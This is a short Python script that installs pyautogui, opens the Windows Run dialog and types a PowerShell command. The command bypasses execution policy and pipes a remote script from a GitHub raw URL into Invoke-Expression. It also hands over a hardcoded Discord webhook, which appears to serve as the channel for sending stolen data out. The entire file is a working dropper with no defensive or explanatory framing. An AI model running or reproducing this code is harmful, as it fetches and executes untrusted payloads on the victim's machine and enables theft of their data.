import subprocess
import sys
import time
webhook_url = 'https://discord.com/api/webhooks/1360748515977859092/NSJZcNLce3vVEh8ERG_FP0ynaER2ZLgopfm3GwCaziCWtYZ4Jdm9qa9ktp6lNNDfytDx'

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
try:
    import pyautogui
except ImportError:
    install('pyautogui')
    import pyautogui
time.sleep(0.1)
pyautogui.hotkey('win', 'r')
time.sleep(0.1)
pyautogui.write("powershell -NoP -Ep Bypass  -C $dc='https://discord.com/api/webhooks/1360748515977859092/NSJZcNLce3vVEh8ERG_FP0ynaER2ZLgopfm3GwCaziCWtYZ4Jdm9qa9ktp6lNNDfytDx'; irm https://raw.githubusercontent.com/stack-crash999/DARKWIRE-MAIN/refs/heads/main/taktikal | iex")
pyautogui.press('enter')
